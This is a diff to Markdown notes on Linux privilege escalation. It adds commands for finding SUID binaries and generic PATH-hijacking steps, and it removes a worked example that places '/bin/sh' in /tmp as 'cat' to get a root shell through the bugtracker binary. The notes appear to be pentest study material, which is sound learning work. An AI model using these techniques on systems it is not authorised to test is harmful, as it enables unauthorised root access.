@@ -26,10 +26,11 @@ This command is used to search for files and directories within a specified dire
 find [path] [expression]
 ```
 
-**find** can be useful to discover all the files that can be executed with root privileges.
+**find** can be useful to discover all the files that can be executed with root privileges because of their SUID bit is enabled.
 ```bash
 find / -perm -4000 2>/dev/null
 ```
+After executing the command can be useful check the binaries with **GTFOBINS**.
 # linpeas.sh
 It is a script designed to assist in privilege escalation enumeration on Linux systems.
 Linpeas is written in Bash scripting language and is designed to be executed directly on the target Linux system. It automates the process of gathering information and performing various checks to identify potential privilege escalation vectors.
@@ -95,14 +96,22 @@ locate bugtracker
 /usr/bin/bugtracker
 ```
 
-# Path hijacking
-When gaining privileges, paying attention to the permissions assigned to each file can provide a significant advantage. For instance, if a file has execution permissions and it belongs to the root user, but you can execute it as a regular user, this can be a potential vulnerability.
+# Path Hijacking
+Path hijacking occurs when an attacker manipulates the $PATH variable to force the system to execute a malicious file instead of the intended command. For doing that, the attacker places a directory under his control at the beginning of $PATH.
+- Example:
+	- Look for a file that can be executed as root.
+	```bash
+	sudo -l
+	```
+	- Find where is this file located and if the location is included in the path.
+	 ```bash 
+	 whereis <file>
+	 echo $PATH
+	 ```
+	 - Create a new file with the exploit code and locate it inside a known directory.
+	 - Modify the $PATH to point to the chosen directory.
+	 ```bash
+	 export PATH=/<directory>:$PATH
+	```
+ 
 
-If, for example, this file (bugtruck) is affected by the vulnerability described, and this executable allows us to input commands in some way, we could make it perform the following:
-```bash
-echo "/bin/sh" > /tmp/cat
-chmod +x /tmp/cat
-export PATH=/tmp:$PATH
-bugtracker /tmp/cat
-```
-Bugtracker executes files with root privileges depending on the path you specify. With the commands we've made, we make it execute the command responsible for creating a new shell, doing so with root privileges.
